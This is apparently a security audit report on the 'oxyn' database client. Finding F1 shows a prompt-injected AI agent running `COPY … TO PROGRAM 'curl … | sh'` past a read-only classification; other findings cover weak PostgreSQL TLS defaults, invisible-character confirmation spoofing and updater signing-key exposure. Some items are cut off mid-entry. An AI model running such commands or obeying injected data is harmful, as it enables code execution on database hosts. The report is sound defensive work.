### F1 — P1 — `COPY … TO PROGRAM` and `COPY … TO '<server file>'` are classified as reads

- **Where**: [classify.rs:559-565](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/crates/oxyn-query/src/classify.rs#L559-L565)
  (`Statement::Copy { to: true, .. } => Facts::READ`, target ignored), the test
  at [classify.rs:945](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/crates/oxyn-query/src/classify.rs#L945)
  that locks it in, [policy.rs:353-453](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/crates/oxyn-core/src/policy.rs#L353-L453),
  [session.rs:375-396](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/drivers/oxyn-driver-postgres/src/session.rs#L375-L396).
- **Scenario**: an agent (prompt injection in a row, or a mistake) calls
  `execute_query` with `COPY (SELECT 1) TO PROGRAM 'curl … | sh'` on a
  PostgreSQL connection whose role is superuser or member of
  `pg_execute_server_program` / `pg_write_server_files` (the default docker
  `postgres` role). Classified Read, the PolicyGate allows it for an
  `Actor::Agent` in every environment, production included; `BEGIN READ ONLY`
  does not stop it because PostgreSQL classes `COPY TO` as strictly read-only.
  Result: command execution or file overwrite on the database host, journaled
  as a Read. A human on production gets no confirmation either.
- **Evidence (executed)**: the repository's own `oxyn_query::classify` (probe
  crate in the scratchpad, rustc 1.98.1) returns `Read None` for the three
  forms. Not run against a live server.
- **Sources**: PostgreSQL 18 `sql-copy.html` and `sql-set-transaction.html`;
  `src/backend/tcop/utility.c` REL_18_STABLE lines 298-313 (consulted
  2026-10-03).
- **Contract**: I-07, I-02, SECURITY § Connection marking.
- **Fix**: only `CopyTarget::Stdout` stays a read; `File` and `Program` become
  at least Unknown, or Write with a dedicated risk; fix the test; optionally,
  the driver refuses non-STDOUT `COPY` under `read_only`.
- **Acceptance**: `is_mutating()` true for the three forms, `COPY t TO STDOUT`
  stays Read; agent on production → `Denied`, on development →
  `NeedsApproval`; human on production → `NeedsApproval` with the connection
  named.

### F2 — P2 — PostgreSQL defaults to `sslmode=prefer` and accepts any mode on production

- **Where**: [postgres options.rs:113-114 and 269-281](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/drivers/oxyn-driver-postgres/src/options.rs#L113-L114),
  form default in [driver.rs:103-116](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/drivers/oxyn-driver-postgres/src/driver.rs#L103-L116);
  contrast [mysql options.rs:169-175](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/drivers/oxyn-driver-mysql/src/options.rs#L169-L175).
- **Scenario**: a production PostgreSQL connection with the TLS field left
  empty, used from a hostile network. An on-path attacker refuses the upgrade or
  presents any certificate (sqlx 0.9 `Prefer` falls back to clear text and
  accepts invalid certificates), relays SCRAM without channel binding or asks
  for cleartext authentication. The same configuration on MySQL is refused.
- **Evidence**: static; installed sqlx-postgres 0.9.0 `connection/tls.rs:27-55`,
  `sasl.rs:53-54`, `establish.rs:74-79`. No network reproduction.
- **Priority note**: the gate pass rated it P1; the refuted batch keeps P2. To
  settle with the fix.
- **Contract**: no PostgreSQL rule exists; ADR-0050 §6 sets the opposite rule
  for MySQL. **Not settled here**: needs a decision or an ADR extending §6.
- **Fix**: verify-full by default, any weaker mode refused unless
  `Environment::Local`, with the MySQL message; one TLS rule stated in SECURITY
  or an ADR.
- **Acceptance**: default production config yields verify-full; `prefer`,
  `require`, `disable`, `allow`, `verify-ca` refused outside Local and accepted
  on Local.

Merges the interface gate observation on invisible characters (same cause).

- **Where**: [commands/ai.rs:127-176](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/crates/oxyn-desktop/src/commands/ai.rs#L127-L176),

- **Scenario**: a webview script calls `ai_save_external_agent` while the user
  types; the native alert has no one-second guard, no deadline, no queue, and
  shows U+2028/U+2029 and bidi overrides unescaped (`validate` only rejects
  category Cc). A reflex Enter or a hidden command declares a program that
  `ai_start_agent` then spawns with the user's privileges. Precondition: script
  execution in the webview.
- **Evidence (executed in part)**: `char::is_control` returns false for U+2028,
  U+2029, U+202E, U+200B, U+2066 (scratchpad program). Rendering of the macOS

- **Contract**: ADR-0037 §2-§4; SECURITY Input surface item 5.
- **Fix**: route through `HostConfirm` with `visible`/`bounded` text and a
  constant confirm label; refuse Zl/Zp/Cf characters in `validate`; bound the
  byte length of command and arguments.
- **Acceptance**: a confirmation under one second declares nothing; U+2028 and
  U+202E are refused or rendered escaped; `native.rs` loses its exception.

- **Where**: [backend/ai.rs:136-156](https://github.com/so-keyldzn/oxyn/blob/8359edb9ecae7f7bc5fa0fd0006b48634a2694c6/crates/oxyn-desktop/src/backend/ai.rs#L136-L156),

## Hypothesis to re-validate (not publishable as is)

### H1 — P1 — The updater signing key shares a job with the untrusted build

Refutation verdict: **not confirmed at the reference**, because the code only
exists on `origin/main` (`1ac0478`, #141, ADR-0051), after `8359edb`. On
`113fc53` the path looks real and no safeguard was found:
`.github/workflows/livraison.yml` job `paquets` builds (`make desktop
PROFIL=release`, which runs `pnpm install` and every build.rs, proc-macro and
Vite plugin), then signs in the same job with `TAURI_SIGNING_PRIVATE_KEY`,
through `script/livraison signer`, which runs `apps/desktop/node_modules/.bin/tauri`
written by the build, with no checksum. Build code can tamper with that binary,
`script/livraison`, `$GITHUB_PATH` or `$GITHUB_ENV`. Whoever gets the key signs
updates every installed Oxyn accepts. `docs/SECURITY.md` and `docs/RELEASE.md`
on `origin/main` promise "the build never holds it". Proposed fix: a separate
signing job, inputs as artifacts, signer pinned by checksum, `contents: write`
only where uploads happen. **Must be re-audited with `113fc53` as reference
before any issue.**
